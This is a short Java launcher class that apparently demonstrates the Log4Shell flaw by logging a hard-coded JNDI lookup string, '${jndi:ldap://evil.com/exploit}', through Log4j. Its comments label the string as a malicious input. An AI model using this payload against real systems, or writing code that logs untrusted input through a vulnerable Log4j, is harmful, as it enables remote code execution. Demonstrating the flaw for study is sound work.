package com.minidroid.launcher;
// Import Log4j classes
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

// The main class for the MiniDroid Launcher.
public class Launcher {
    // Initialize a logger instance for this class.
    private static final Logger logger = LogManager.getLogger(Launcher.class);

    // The main method of the launcher application.
    public static void main(String[] args) {
        // Simulating usage of the vulnerable logger
        // A malicious user input string that attempts to exploit the Log4Shell vulnerability.
        String userInput = "${jndi:ldap://evil.com/exploit}";
        // Log the user input at the ERROR level.
        // This is where the Log4Shell vulnerability can be triggered.
        logger.error("User input: " + userInput); 
        // Print a message to the console indicating that the launcher has started.
        System.out.println("MiniDroid Launcher Started...");
    }
}
